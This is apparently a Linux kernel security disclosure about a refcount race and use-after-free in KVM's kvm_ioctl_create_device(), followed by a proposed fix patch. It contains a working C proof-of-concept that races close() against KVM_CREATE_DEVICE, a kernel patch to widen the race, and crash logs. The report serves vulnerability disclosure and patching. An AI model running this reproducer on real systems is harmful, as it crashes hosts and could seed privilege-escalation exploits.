@@ -1,0 +1,288 @@
+kvm_ioctl_create_device() contains the following code:
+
+        dev = kzalloc(sizeof(*dev), GFP_KERNEL);
+        if (!dev)
+                return -ENOMEM;
+
+        dev->ops = ops;
+        dev->kvm = kvm;
+
+        mutex_lock(&kvm->lock);
+        ret = ops->create(dev, cd->type);
+        if (ret < 0) {
+                mutex_unlock(&kvm->lock);
+                kfree(dev);
+                return ret;
+        }
+        list_add(&dev->vm_node, &kvm->devices);
+        mutex_unlock(&kvm->lock);
+
+        if (ops->init)
+                ops->init(dev);
+
+        ret = anon_inode_getfd(ops->name, &kvm_device_fops, dev, O_RDWR | O_CLOEXEC);
+        if (ret < 0) {
+                mutex_lock(&kvm->lock);
+                list_del(&dev->vm_node);
+                mutex_unlock(&kvm->lock);
+                ops->destroy(dev);
+                return ret;
+        }
+
+        kvm_get_kvm(kvm);
+        cd->fd = ret;
+
+This code:
+
+1. creates a device that holds a reference to the VM object (with a borrowed
+   reference, the VM's refcount has not been bumped yet)
+2. initializes the device
+3. transfers the reference to the device to the caller's file descriptor table
+4. calls kvm_get_kvm() to turn the borrowed reference to the VM into a real
+   reference
+
+The ownership transfer in step 3 must not happen before the reference to the VM
+becomes a proper, non-borrowed reference, which only happens in step 4.
+After step 3, an attacker can close the file descriptor and drop the borrowed
+reference, which can cause the refcount of the kvm object to drop to zero.
+
+Reproducer code:
+
+=================================
+// run as `gcc -o kvm_fd_install kvm_fd_install.c -Wall -pthread && ./kvm_fd_install`
+#include <pthread.h>
+#include <fcntl.h>
+#include <err.h>
+#include <linux/kvm.h>
+#include <sys/ioctl.h>
+#include <stdio.h>
+#include <unistd.h>
+
+static int predicted_fd = -1;
+static volatile int ready = 0;
+
+static void *do_close_predicted_fd(void *dummy) {
+  ready = 1;
+  while (1) close(predicted_fd);
+  return NULL; /*unreachable*/
+}
+
+int main(void) {
+  int kvm = open("/dev/kvm", O_RDWR);
+  if (kvm == -1) err(1, "open kvm");
+  int vm = ioctl(kvm, KVM_CREATE_VM, 0);
+  if (vm < 0) err(1, "KVM_CREATE_VM");
+
+  predicted_fd = dup(0);
+  if (predicted_fd == -1) err(1, "dup");
+  close(predicted_fd);
+
+  pthread_t thread;
+  if (pthread_create(&thread, NULL, do_close_predicted_fd, NULL)) errx(1, "pthread_create");
+  while (ready == 0) /*spin*/;
+
+  struct kvm_create_device cd = {
+    .type = KVM_DEV_TYPE_VFIO,
+    .fd = -1, //outparm
+    .flags = 0
+  };
+  if (ioctl(vm, KVM_CREATE_DEVICE, &cd)) err(1, "KVM_CREATE_DEVICE");
+  printf("created device: %d\n", cd.fd);
+}
+=================================
+
+To reliably reproduce the issue, patch the kernel as follows to widen the race:
+=================================
+diff --git a/virt/kvm/kvm_main.c b/virt/kvm/kvm_main.c
+index 5ecea812cb6a..d43677044ec0 100644
+--- a/virt/kvm/kvm_main.c
++++ b/virt/kvm/kvm_main.c
+@@ -51,6 +51,7 @@
+ #include <linux/slab.h>
+ #include <linux/sort.h>
+ #include <linux/bsearch.h>
++#include <linux/delay.h>
+ 
+ #include <asm/processor.h>
+ #include <asm/io.h>
+@@ -2970,6 +2971,8 @@ static int kvm_ioctl_create_device(struct kvm *kvm,
+        bool test = cd->flags & KVM_CREATE_DEVICE_TEST;
+        int ret;
+ 
++       pr_warn("kvm_ioctl_create_device: entry: refcount=%u\n", refcount_read(&kvm->users_count));
++
+        if (cd->type >= ARRAY_SIZE(kvm_device_ops_table))
+                return -ENODEV;
+ 
+@@ -3000,6 +3003,8 @@ static int kvm_ioctl_create_device(struct kvm *kvm,
+        if (ops->init)
+                ops->init(dev);
+ 
++       pr_warn("kvm_ioctl_create_device: before anon_inode_getfd: refcount=%u\n", refcount_read(&kvm->users_count));
++
+        ret = anon_inode_getfd(ops->name, &kvm_device_fops, dev, O_RDWR | O_CLOEXEC);
+        if (ret < 0) {
+                mutex_lock(&kvm->lock);
+@@ -3009,8 +3014,13 @@ static int kvm_ioctl_create_device(struct kvm *kvm,
+                return ret;
+        }
+ 
++       pr_warn("kvm_ioctl_create_device: after anon_inode_getfd: refcount=%u\n", refcount_read(&kvm->users_count));
++       msleep(100);
++       pr_warn("kvm_ioctl_create_device: after sleeping: refcount=%u\n", refcount_read(&kvm->users_count));
++
+        kvm_get_kvm(kvm);
+        cd->fd = ret;
++       pr_warn("kvm_ioctl_create_device: exiting: refcount=%u\n", refcount_read(&kvm->users_count));
+        return 0;
+ }
+=================================
+
+splat in a patched kernel:
+=================================
+[  224.536858] kvm_ioctl_create_device: entry: refcount=1
+[  224.539410] kvm_ioctl_create_device: before anon_inode_getfd: refcount=1
+[  224.541542] kvm_ioctl_create_device: after anon_inode_getfd: refcount=1
+[  224.651860] BUG: unable to handle kernel paging request at ffffc900015deb08
+[  224.653744] #PF error: [normal kernel read fault]
+[  224.655032] PGD 1ead35067 P4D 1ead35067 PUD 1eaeb6067 PMD 1e2c46067 PTE 0
+[  224.656834] Oops: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC KASAN
+[  224.658364] CPU: 0 PID: 1155 Comm: kvm_fd_install Not tainted 5.0.0-rc3+ #251
+[  224.660252] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1 04/01/2014
+[  224.662551] RIP: 0010:kvm_vm_ioctl+0xd75/0xdd0
+[  224.663746] Code: c7 c7 a0 f3 a0 a8 e8 53 fa 21 00 bf 64 00 00 00 e8 a0 e5 24 00 be 04 00 00 00 4c 89 ef e8 03 ba 42 00 4c 89 ef e8 cb d8 42 00 <8b> b5 08 9b 00 00 48 c7 c7 00 f4 a0 a8 e8 22 fa 21 00 48 89 ef e8
+[  224.668662] RSP: 0018:ffff8881e3c3f988 EFLAGS: 00010246
+[  224.670057] RAX: 0000000000000000 RBX: 1ffff1103c787f36 RCX: ffffffffa6a2c325
+[  224.671950] RDX: 0000000000000003 RSI: dffffc0000000000 RDI: ffffc900015deb08
+[  224.673835] RBP: ffffc900015d5000 R08: fffff520002bbd62 R09: fffff520002bbd62
+[  224.675731] R10: 0000000000000001 R11: fffff520002bbd61 R12: ffff8881d65863e0
+[  224.677615] R13: ffffc900015deb08 R14: ffff8881d65863c8 R15: ffffffffa9653bc0
+[  224.679506] FS:  00007f11f9500700(0000) GS:ffff8881eb000000(0000) knlGS:0000000000000000
+[  224.681643] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  224.684886] CR2: ffffc900015deb08 CR3: 00000001dfc20003 CR4: 00000000003606f0
+[  224.686788] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[  224.688674] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+[  224.690565] Call Trace:
+[...]
+[  224.721351]  do_vfs_ioctl+0x134/0x8f0
+[...]
+[  224.732860]  ksys_ioctl+0x70/0x80
+[  224.733749]  __x64_sys_ioctl+0x3d/0x50
+[  224.734764]  do_syscall_64+0x73/0x160
+[  224.735743]  entry_SYSCALL_64_after_hwframe+0x44/0xa9
+[  224.737092] RIP: 0033:0x7f11f8e21dd7
+[  224.738048] Code: 00 00 00 48 8b 05 c1 80 2b 00 64 c7 00 26 00 00 00 48 c7 c0 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 91 80 2b 00 f7 d8 64 89 01 48
+[  224.742945] RSP: 002b:00007ffeb6611e58 EFLAGS: 00000202 ORIG_RAX: 0000000000000010
+[  224.744932] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007f11f8e21dd7
+[  224.746810] RDX: 00007ffeb6611e64 RSI: 00000000c00caee0 RDI: 0000000000000004
+[  224.748681] RBP: 00007ffeb6611e80 R08: 00007f11f8d40700 R09: 00007f11f8d40700
+[  224.750556] R10: 00007f11f8d409d0 R11: 0000000000000202 R12: 0000564cddd8a7b0
+[  224.752433] R13: 00007ffeb6611f60 R14: 0000000000000000 R15: 0000000000000000
+[  224.754311] Modules linked in: btrfs xor zstd_compress raid6_pq
+[  224.755904] CR2: ffffc900015deb08
+[  224.756792] ---[ end trace 670d8a6b1c3ab210 ]---
+=================================
+
+Without the patch, I can still crash a Debian stable distro kernel by running
+the reproducer in a loop (`while true; do ./kvm_fd_install; done`), but it takes
+a while to trigger:
+=================================
+[  251.054762] BUG: unable to handle kernel NULL pointer dereference at 00000000000000a8
+[  251.057734] IP: [<ffffffff95a1695b>] down_write+0x1b/0x40
+[  251.059903] PGD 0 
+
+[  251.061455] Oops: 0002 [#1] SMP
+[  251.062661] Modules linked in: ipt_MASQUERADE nf_nat_masquerade_ipv4 nf_conntrack_netlink nfnetlink xfrm_user xfrm_algo iptable_nat nf_conntrack_ipv4 nf_defrag_ipv4 nf_nat_ipv4 xt_addrtype iptable_filter xt_conntrack nf_nat nf_conntrack br_netfilter bridge stp llc aufs(O) overlay snd_hda_codec_generic kvm_intel snd_hda_intel qxl kvm ttm irqbypass crct10dif_pclmul crc32_pclmul ghash_clmulni_intel drm_kms_helper snd_hda_codec snd_hda_core joydev virtio_balloon snd_hwdep evdev sg snd_pcm 9pnet_virtio serio_raw snd_timer snd button virtio_console binfmt_misc soundcore pcspkr drm 9p 9pnet fscache ip_tables x_tables autofs4 ext4 crc16 jbd2 fscrypto ecb mbcache btrfs crc32c_generic xor hid_generic usbhid hid raid6_pq sr_mod cdrom ata_generic virtio_blk virtio_net crc32c_intel ata_piix aesni_intel uhci_hcd
+[  251.085764]  ehci_pci aes_x86_64 ehci_hcd glue_helper libata lrw gf128mul ablk_helper psmouse i2c_piix4 cryptd virtio_pci usbcore virtio_ring usb_common scsi_mod virtio floppy
+[  251.090094] CPU: 4 PID: 6392 Comm: kvm_fd_install Tainted: G           O    4.9.0-8-amd64 #1 Debian 4.9.130-2
+[  251.092751] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1 04/01/2014
+[  251.094947] task: ffff949b676f10c0 task.stack: ffffb79691840000
+[  251.096524] RIP: 0010:[<ffffffff95a1695b>]  [<ffffffff95a1695b>] down_write+0x1b/0x40
+[  251.098605] RSP: 0018:ffffb79691843bf0  EFLAGS: 00010246
+[  251.100029] RAX: 00000000000000a8 RBX: 00000000000000a8 RCX: ffffb79691843c28
+[  251.101904] RDX: ffffffff00000001 RSI: 0000000000000286 RDI: 00000000000000a8
+[  251.103786] RBP: ffff949b4650b1d8 R08: 0000000000000000 R09: 0000000000000000
+[  251.105659] R10: ffff949b66a84510 R11: ffffdb9787f9bf80 R12: ffff949b4650b220
+[  251.107556] R13: ffff949b4650b180 R14: ffffffff96310034 R15: ffff949b4650b180
+[  251.109423] FS:  0000000000000000(0000) GS:ffff949b73d00000(0000) knlGS:0000000000000000
+[  251.111560] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[  251.113081] CR2: 00000000000000a8 CR3: 00000001cf808000 CR4: 0000000000360670
+[  251.114956] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[  251.116847] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
+[  251.118718] Stack:
+[  251.119277]  ffff949b67cc0000 ffffffff956933f1 ffffb79691843c00 ffff949b67cc0000
+[  251.122232]  ffff949b67cc0000 ffff949b69ce4b68 ffff949b6a624060 ffff949b693cd740
+[  251.124294]  ffff949b69ce4b68 ffffffffc07410b2 ffff949b67cc0000 0000000000000008
+[  251.126345] Call Trace:
+[  251.127015]  [<ffffffff956933f1>] ? debugfs_remove_recursive+0x51/0x1c0
+[  251.128780]  [<ffffffffc07410b2>] ? kvm_put_kvm+0x32/0x1d0 [kvm]
+[  251.130366]  [<ffffffffc07412bd>] ? kvm_vm_release+0x1d/0x30 [kvm]
+[  251.132000]  [<ffffffff9560cfb8>] ? __fput+0xd8/0x220
+[  251.133327]  [<ffffffff95498a5f>] ? task_work_run+0x7f/0xa0
+[  251.134790]  [<ffffffff9547ed15>] ? do_exit+0x2d5/0xaf0
+[  251.136163]  [<ffffffff9547f5aa>] ? do_group_exit+0x3a/0xa0
+[  251.137618]  [<ffffffff9548a5f9>] ? get_signal+0x299/0x640
+[  251.139056]  [<ffffffff95426476>] ? do_signal+0x36/0x6a0
+[  251.140458]  [<ffffffffc075ca25>] ? kvm_arch_hardware_disable+0x15/0x40 [kvm]
+[  251.142324]  [<ffffffff9560d05d>] ? __fput+0x17d/0x220
+[  251.143687]  [<ffffffff95498a64>] ? task_work_run+0x84/0xa0
+[  251.145156]  [<ffffffff95403721>] ? exit_to_usermode_loop+0x71/0xb0
+[  251.146794]  [<ffffffff95403bcd>] ? do_syscall_64+0xdd/0xf0
+[  251.148261]  [<ffffffff95a18f8e>] ? entry_SYSCALL_64_after_swapgs+0x58/0xc6
+[  251.150074] Code: 01 74 08 48 c7 43 20 01 00 00 00 5b c3 0f 1f 00 0f 1f 44 00 00 53 48 89 fb e8 b2 df ff ff 48 ba 01 00 00 00 ff ff ff ff 48 89 d8 <f0> 48 0f c1 10 85 d2 74 05 e8 17 be d2 ff 65 48 8b 04 25 c0 fb 
+[  251.157011] RIP  [<ffffffff95a1695b>] down_write+0x1b/0x40
+[  251.158480]  RSP <ffffb79691843bf0>
+[  251.159418] CR2: 00000000000000a8
+[  251.160300] ---[ end trace b3803036d037ea83 ]---
+[  251.161513] Fixing recursive fault but reboot is needed!
+=================================
+
+I have requested a CVE identifier from MITRE, but haven't heard back yet.
+
+I am attaching a suggested patch; here's an inline copy for review (with
+clobbered whitespace):
+
+===========================================
+From 7396c501baf3f066c05a74c790775c2c686be8a7 Mon Sep 17 00:00:00 2001
+From: Jann Horn <jannh@google.com>
+Date: Sat, 26 Jan 2019 01:19:40 +0100
+Subject: [PATCH] kvm: fix temporary refcount drop in kvm_ioctl_create_device()
+
+As soon as we call anon_inode_getfd(), userspace can close the device,
+causing a kvm_put_kvm() call that drops a reference. This means that we
+need to grab a reference for the device before anon_inode_getfd(),
+otherwise the VM can disappear from under us.
+
+Fixes: 852b6d57dc7f ("kvm: add device control API")
+Cc: stable@kernel.org
+Signed-off-by: Jann Horn <jannh@google.com>
+---
+ virt/kvm/kvm_main.c | 3 ++-
+ 1 file changed, 2 insertions(+), 1 deletion(-)
+
+diff --git a/virt/kvm/kvm_main.c b/virt/kvm/kvm_main.c
+index 5ecea812cb6a..585845203db8 100644
+--- a/virt/kvm/kvm_main.c
++++ b/virt/kvm/kvm_main.c
+@@ -3000,8 +3000,10 @@ static int kvm_ioctl_create_device(struct kvm *kvm,
+        if (ops->init)
+                ops->init(dev);
+ 
++       kvm_get_kvm(kvm);
+        ret = anon_inode_getfd(ops->name, &kvm_device_fops, dev, O_RDWR | O_CLOEXEC);
+        if (ret < 0) {
++               kvm_put_kvm(kvm);
+                mutex_lock(&kvm->lock);
+                list_del(&dev->vm_node);
+                mutex_unlock(&kvm->lock);
+@@ -3009,7 +3011,6 @@ static int kvm_ioctl_create_device(struct kvm *kvm,
+                return ret;
+        }
+ 
+-       kvm_get_kvm(kvm);
+        cd->fd = ret;
+        return 0;
+ }
+-- 
+2.20.1.495.gaa96b0ce6b-goog
+===========================================
